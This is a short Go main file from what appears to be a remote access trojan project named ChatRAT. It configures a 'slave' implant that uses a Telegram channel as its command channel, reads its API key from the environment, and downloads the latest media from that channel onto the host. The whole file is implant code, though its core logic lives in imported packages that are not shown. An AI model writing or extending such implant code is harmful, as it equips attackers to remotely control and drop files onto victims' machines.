package main

import (
	"github.com/cyb3rjerry/ChatRAT/pkg/listeners/telegram"
	"github.com/cyb3rjerry/ChatRAT/pkg/slave"
	"github.com/joho/godotenv"
	"log"
	"os"
)

func main() {
	godotenv.Load()

	config := telegram.TelegramConfig{
		ApiKey:    os.Getenv("SLAVE_API_KEY"),
		ChannelID: 1,
	}
	s := slave.NewSlave(config)
	err := s.Listener.GetLatestMedia("./")
	if err != nil {
		log.Println(err)
	}

}
